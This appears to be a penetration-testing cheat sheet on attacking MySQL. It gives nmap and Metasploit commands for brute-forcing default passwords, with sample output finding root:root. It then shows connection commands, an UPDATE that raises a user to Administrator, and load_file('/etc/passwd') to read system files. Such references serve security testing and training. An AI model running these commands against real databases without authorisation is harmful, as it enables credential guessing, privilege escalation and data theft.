---
title: "MySQL General"
tags: ["Database Dumping", "Privilege Escalation In Databases", "Mysql", "Database"]
---

### Default Password Spraying

{{< tab set1 tab1 >}}nmap{{< /tab >}}
{{< tab set1 tab2 >}}metasploit{{< /tab >}}
{{< tabcontent set1 tab1 >}}

```console 
sudo nmap -p3306 --script=mysql-brute <TARGET>
```

```console {class="sample-code"}
$ sudo nmap -p3306 --script=mysql-brute 127.0.0.1
Nmap scan report for localhost (127.0.0.1)
Host is up (0.000078s latency).

PORT     STATE SERVICE
3306/tcp open  mysql
| mysql-brute: 
|   Accounts: 
|     root:root - Valid credentials
|_  Statistics: Performed 45009 guesses in 6 seconds, average tps: 7501.5

Nmap done: 1 IP address (1 host up) scanned in 7.12 seconds
```

{{< /tabcontent >}}
{{< tabcontent set1 tab2 >}}

```console
use auxiliary/scanner/mysql/mysql_login
```

```console {class="sample-code"}
msf auxiliary(scanner/mysql/mysql_login) > options

Module options (auxiliary/scanner/mysql/mysql_login):

   Name              Current Setting                                            Required  Description
   ----              ---------------                                            --------  -----------
   ANONYMOUS_LOGIN   false                                                      yes       Attempt to login with a blank username and password
   BLANK_PASSWORDS   true                                                       no        Try blank passwords for all users
   BRUTEFORCE_SPEED  5                                                          yes       How fast to bruteforce, from 0 to 5
   CreateSession     false                                                      no        Create a new session for every successful login
   DB_ALL_CREDS      false                                                      no        Try each user/password couple stored in the current database
   DB_ALL_PASS       false                                                      no        Add all passwords in the current database to the list
   DB_ALL_USERS      false                                                      no        Add all users in the current database to the list
   DB_SKIP_EXISTING  none                                                       no        Skip existing credentials stored in the current database (Accepted: none, user, user&realm)
   PASSWORD                                                                     no        A specific password to authenticate with
   PASS_FILE                                                                    no        File containing passwords, one per line
   Proxies                                                                      no        A proxy chain of format type:host:port[,type:host:port][...]. Supported proxies: socks5h, sapni, http, socks4, socks5
   RHOSTS            127.0.0.1                                                  yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT             3306                                                       yes       The target port (TCP)
   STOP_ON_SUCCESS   true                                                       yes       Stop guessing when a credential works for a host
   THREADS           1                                                          yes       The number of concurrent threads (max one per host)
   USERNAME          root                                                       no        A specific username to authenticate as
   USERPASS_FILE                                                                no        File containing users and passwords separated by space, one pair per line
   USER_AS_PASS      true                                                       no        Try the username as the password for all users
   USER_FILE         /usr/share/seclists/Usernames/top-usernames-shortlist.txt  no        File containing usernames, one per line
   VERBOSE           true                                                       yes       Whether to print output for all attempts


View the full module info with the info, or info -d command.

msf auxiliary(scanner/mysql/mysql_login) > run
[+] 127.0.0.1:3306        - 127.0.0.1:3306 - Found remote MySQL version 11.8.3
[!] 127.0.0.1:3306        - No active DB -- Credential data will not be saved!
[+] 127.0.0.1:3306        - 127.0.0.1:3306 - Success: 'root:root'
[*] 127.0.0.1:3306        - Scanned 1 of 1 hosts (100% complete)
[*] 127.0.0.1:3306        - Bruteforce completed, 1 credential was successful.
[*] 127.0.0.1:3306        - You can open an MySQL session with these credentials and CreateSession set to true
[*] Auxiliary module execution completed
```

{{< /tabcontent >}}

### Connect to MySQL Database

```console
mysql -u <USER> -h <TARGET> -p'<PASSWORD>'
```

```console
# Database known
mysql -u <USER> -D <DB_NAME> -h <TARGET> -p'<PASSWORD>'
```

```console
# Skip SSL
mysql -u <USER> -h <TARGET> -p'<PASSWORD>' --skip-ssl
```

```console
# Execute query inline
mysql -u <USER> -D <DB_NAME> -h <TARGET> -p'<PASSWORD>' -e '<QUERY>'
```

```console {class="sample-code"}
mysql -u <USER> -D <DB_NAME> -h <TARGET> -p'<PASSWORD>' -e 'show tables;'
```

---

### General

```console
# Show all databases
show databases;
```

```console
# Choose database
use <DB_NAME>;
```

```console
# Show all tables
show tables;
```

```console
# Show all entries in table_name
select * from <TABLE_NAME>;
```

---

### Insert Entry

```console
INSERT INTO <TABLE_NAME> (<COLUMN_1>,<COLUMN_2>,...) VALUES (<VALUE_1>,<VALUE_2>,...);
```

---

### Update Entry

```console
# Update Entry Example
UPDATE users set user_type='Administrator' where email='test@example.com';
```

---

### Arbitrary File Read

```console
select load_file("<FILE>");
```

```console {class="sample-code"}
select load_file("/etc/passwd");
```